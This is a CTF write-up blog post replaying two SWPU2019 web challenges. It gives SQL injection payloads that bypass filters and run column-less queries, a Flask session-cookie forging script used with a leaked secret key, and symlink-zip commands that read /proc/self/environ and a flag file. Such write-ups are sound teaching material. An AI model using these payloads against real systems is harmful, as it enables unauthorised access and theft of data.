<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!--!--><title>Tag: JWT伪造 - ggb0n&#039;s Blog</title><meta description="网络安全, CTF, 机器学习"><meta property="og:type" content="website"><meta property="og:title" content="ggb0n"><meta property="og:url" content="http://ggb0n.cool/"><meta property="og:site_name" content="ggb0n&#039;s blog"><meta property="og:description" content="网络安全, CTF, 机器学习"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://ggb0n.cool/images/icon2.png"><meta property="article:author" content="ggb0n"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://ggb0n.cool/images/icon2.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://ggb0n.cool/"},"headline":"ggb0n","image":["http://www.ggb0n.cool/images/back2.png"],"author":{"@type":"Person","name":"ggb0n"},"description":"网络安全, CTF, 机器学习"}</script><link rel="alternative" href="http://ggb0n.cool/search.xml" title="ggb0n&#039;s Blog" type="application/atom+xml"><link rel="icon" href="http://www.ggb0n.cool/images/icon2.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><script src="/js/md5.min.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/" alt="ggb0n&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">JWT伪造</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-03-20T11:55:48.000Z">2020-03-20</time><span class="level-item">21 minutes read (About 3146 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/03/20/SWPU2019%E5%A4%8D%E7%8E%B0/">SWPU2019复现</a></h1><div class="content"><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>二次注入、无列名查询，对<code>MariaDB</code>过滤<code>information_schema</code>的注入。</p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目注册并登陆之后，发现可以发布广告，并且在广告名的地方存在<code>二次注入</code>(提交内容的时候注入不执行，查询的时候才执行)，经过测试发现<code>or</code>被ban了，同时空格也会被替换为空，因此需要利用<code>/**/</code>绕过对空格的过滤。<br>既然<code>or</code>被ban掉了，那么便不能再利用<code>order by</code>注入查列数了，此时只能直接利用<code>union select</code>进行列名的遍历了。<br>在测试的过程中发现了后台数据库是<code>MariaDB</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web50.png" alt=""><br>同时<code>or</code>被ban掉，因此<code>information_schema</code>不能用，此时想到利用<code>mysql.innodb_table_stats</code>来查表名(这个地方可以参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/)，但是无法获取列名，因此最终获取flag需要借助`无列名注入`了(参考：https://blog.csdn.net/chasingin/article/details/103476001)。">https://mariadb.com/kb/en/mysqlinnodb_table_stats/)，但是无法获取列名，因此最终获取flag需要借助`无列名注入`了(参考：https://blog.csdn.net/chasingin/article/details/103476001)。</a></p>
<p>现在思路就很明确了，首先利用<code>union select</code>测试出列数，然后利用<code>mysql.innodb_table_stats</code>查出表名，最后无列名注入拿到flag。</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>首先查列数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p>利用<code>mysql.innodb_table_stats</code>查表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ggb0n.cool/images/BUUCTF-web48.png" alt=""><br>将列转换为行，进行无列名注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ggb0n.cool/images/BUUCTF-web49.png" alt=""></p>
<p>另外补充一点，如果后台数据库是<code>mysql</code>，但是<code>information_schema</code>被ban掉之后，如果<code>mysql</code>没有开启<code>innodb存储引擎</code>则可利用<code>sys数据库``schema_auto_increment_columns</code>和<code>schema_table_statistics_with_buffer</code>来绕过，但是本题后台数据库是<code>MariaDB</code>，上述方法便不可用，不过给一下我做题的时候测试的payload，遇到类似题目可能用得上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;sys.schema_auto_increment_column&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;sys.schema_table_statistics_with_buffer&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>

<p>然后再利用<code>join</code>或<code>join...using</code>进行无列名查询即可。<br>绕过<code>information_schema</code>可以参考：<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p>
<h2 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h2><p>考察JWT伪造攻击，软链接任意文件读取</p>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目是一个登录框，任意用户名密码登录，发现可以进行文件上传：<br><img src="http://ggb0n.cool/images/swpuctf02.png" alt=""></p>
<p>直接点按钮反馈没有权限…</p>
<p>看源码发现了<code>404 not found</code>的提示，网上的wp是这么说的：</p>
<blockquote>
<p>在<code>flask</code>中，可以使用<code>app.errorhandler()</code>装饰器来注册错误处理函数，参数是<code>HTTP 错误状态码</code>或者<code>特定的异常类</code>，由此我们可以联想到在<code>404</code>错误中会有东西存在。</p>
</blockquote>
<p>那么我们构造一个任意的文件到url中去访问，看一下回显：<br><img src="http://ggb0n.cool/images/swpuctf03.png" alt=""></p>
<p>发现响应头中存在<br><code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p>
<p>解码得到：<br><code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code></p>
<p>结合前面的权限要求，猜测是JWT伪造了，但是这个题中的JWT直接去解base64的结果是这样的：<br><code>{&quot;id&quot;:{&quot; b&quot;:&quot;MTAw&quot;},&quot;is_login&quot;:true,&quot;password&quot;:&quot;123&quot;,&quot;username&quot;:&quot;123&quot;}</code></p>
<p>期初一直以这种结构去伪造，服务器就老是反馈<code>500 error</code>，后来参考网上一篇wp中讲的解JWT用的是如下的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">""" Flask Session Cookie Decoder/Encoder """</span></span><br><span class="line">__author__ = <span class="string">'Wilson Sumanang, Alexandre ZANNI'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">'Must be using at least Python 3'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span><span class="params">(ABC)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">            <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">            <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">'Flask Session Cookie Decoder/Encoder'</span>,</span><br><span class="line">                epilog=<span class="string">"Author : Wilson Sumanang, Alexandre ZANNI"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(help=<span class="string">'sub-command help'</span>, dest=<span class="string">'subcommand'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">'encode'</span>, help=<span class="string">'encode'</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-t'</span>, <span class="string">'--cookie-structure'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie structure'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">'decode'</span>, help=<span class="string">'decode'</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Secret key'</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-c'</span>, <span class="string">'--cookie-value'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                help=<span class="string">'Session cookie value'</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">'encode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">'decode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure>

<p>用法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">解密:python flask_session_manager.py decode -c -s <span class="comment"># -c是flask cookie里的session值 -s参数是SECRET_KEY</span></span><br><span class="line">加密:python flask_session_manager.py encode -s -t <span class="comment"># -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</span></span><br></pre></td></tr></table></figure>

<p>按照这个代码解JWT结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_manager.py decode -c <span class="string">"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSqQQ.0VoijfPiLI6lwy9zvZ-yk5U5Lv8"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line">&#123;<span class="string">'id'</span>: <span class="string">b'100'</span>, <span class="string">'is_login'</span>: <span class="literal">True</span>, <span class="string">'password'</span>: <span class="string">'123'</span>, <span class="string">'username'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">这里就可以看出不一样了，现在还没搞懂原因...</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_manager.py encode -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span> -t <span class="string">"&#123;'id': b'1', 'is_login': True, 'password': '123', 'username': '123'&#125;"</span></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y<span class="number">-3</span>TE</span><br><span class="line">这里我们伪造id:<span class="string">b'1'</span>的用户session进行登录</span><br></pre></td></tr></table></figure>

<p>利用伪造的session，成功登录：<br><img src="http://ggb0n.cool/images/swpuctf01.png" alt=""></p>
<p>查看源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure>

<p>以正常逻辑来看，这里的功能就是客户端上传一个压缩后的图片，服务端会解压缩后并读取图片返回客户端。这里我们可以上传一个<code>软链接压缩包</code>，来读取其他敏感文件而不是我们上传的文件。</p>
<p>结合 <code>showflag()</code>函数的源码，我们可以得知 <code>flag.jpg</code> 放在 flask 应用根目录的<code>flag</code>目录下。那么我们只要创建一个到<code>/xxx/flask/flag/flag.jpg</code>的软链接，即可读取 <code>flag.jpg</code> 文件。</p>
<p>两种方式构造：</p>
<ul>
<li>1、在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg。</li>
</ul>
<blockquote>
<p>命令如下：</p>
<p>ln -s /proc/self/cwd/flag/flag.jpg qwe </p>
<p>zip -ry qwe.zip qwe</p>
</blockquote>
<ul>
<li>2、在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</li>
</ul>
<blockquote>
<p>命令如下：</p>
<p>ln -s /proc/self/environ qqq </p>
<p>zip -ry qqq.zip qqq </p>
<p>ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www </p>
<p>zip -ry [<a href="http://www.zip\]\(http://www.zip\)">www.zip\]\(http://www.zip\)</a> www</p>
</blockquote>
